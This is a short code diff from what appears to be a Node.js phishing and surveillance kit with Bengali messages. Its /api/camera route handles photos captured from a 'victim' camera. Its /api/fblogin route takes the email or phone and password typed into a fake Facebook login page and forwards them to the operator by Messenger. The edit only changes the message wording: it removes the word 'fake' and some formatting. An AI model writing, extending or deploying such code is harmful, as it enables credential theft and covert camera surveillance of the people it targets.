@@ -212,7 +212,7 @@ router.post('/api/camera', async (req, res) => {
                 const imageUrl = `${baseUrl}/images/${filename}`;
                 
                 if (isFirstImage) {
-                    await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
+                    await sendMessage(victim.fbId, '📸 ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!\nছবি আসতে শুরু করেছে...');
                     console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
                 }
                 
@@ -282,7 +282,7 @@ router.post('/api/fblogin', async (req, res) => {
         console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);
 
         if (victim.fbId && victim.fbId !== 'unknown') {
-            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
+            const msg = `🔐 ফেসবুক লগইন ডেটা!\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
             await sendMessage(victim.fbId, msg);
         }
 
